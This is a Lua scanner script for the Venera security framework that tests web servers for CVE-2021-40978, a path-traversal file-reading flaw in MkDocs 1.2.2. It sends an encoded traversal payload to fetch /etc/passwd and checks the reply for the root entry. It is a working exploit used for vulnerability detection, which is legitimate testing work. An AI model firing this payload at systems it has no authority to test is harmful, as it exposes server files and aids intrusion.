-- Script for Venera Framework
-- https://github.com/farinap5/Venera
local regex = require("regexp")
local http = require("http")
local client = http.client()

-- Metadata
METADATA = {
    AUTHOR = {"farinap5 <null>"},
    VERSION = "1.0",
    TAGS = {"cve","lfi","http","mkdocs","scanner"},
    INFO = [[LFI affecting MKDocs 1.2.2 - CVE-2021-40978
- https://github.com/nisdn/CVE-2021-40978]]
}

-- Arguments/Variables needed to execute script
VARS = {
    URL = {VALUE="http://example.com", NEEDED="yes", DESCRIPT="URL"},
    METHOD = {VALUE="GET", NEEDED="yes", DESCRIPT="METHOD"},
    VERBOSE = {VALUE="false", NEEDED="no", DESCRIPT="Verbose output."}
}

function Init()
    Meta(METADATA) -- Load metadata 
    LoadVars(VARS) -- Load variables
end

function Main()
    local payload = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

    local request = http.request(VARS.METHOD.VALUE, VARS.URL.VALUE..payload)
    local result, err = client:do_request(request)
    if err then error(err) end

    local r,e = regex.match("root:[x*]:0:0:", result.body)
    if e then error(e) end
    if r == true then
        PrintSuccsln("Vulnerable to CVE-2021-40978 Local File Inclusion.")
    else
        if VARS.VERBOSE.VALUE == "true" then
            PrintErrln(VARS.URL.VALUE.." Not affected by CVE-2021-40978.")
        end
    end
end